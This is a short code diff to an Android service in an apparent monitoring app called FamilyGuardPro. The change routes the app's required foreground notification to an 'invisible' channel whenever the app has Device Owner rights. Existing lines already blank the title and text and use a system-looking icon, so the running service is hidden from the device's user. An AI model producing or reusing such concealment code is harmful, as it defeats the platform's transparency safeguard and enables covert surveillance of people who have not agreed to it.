@@ -111,7 +111,20 @@ class PersistentService : Service() {
      * Show foreground notification immediately to satisfy Android's requirement
      */
     private fun showForegroundNotification() {
-        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_PERSISTENT)
+        // Check if Device Owner mode - use invisible channel
+        val doManager = try {
+            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
+        } catch (e: Exception) { null }
+        
+        val channelId = if (doManager?.isDeviceOwner() == true) {
+            // Use invisible channel for DO mode
+            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
+            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
+        } else {
+            FamilyGuardApp.NOTIFICATION_CHANNEL_PERSISTENT
+        }
+        
+        val notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("") // Empty title to minimize visibility
             .setContentText("") // Empty text
             .setSmallIcon(R.drawable.ic_system_service_notification)
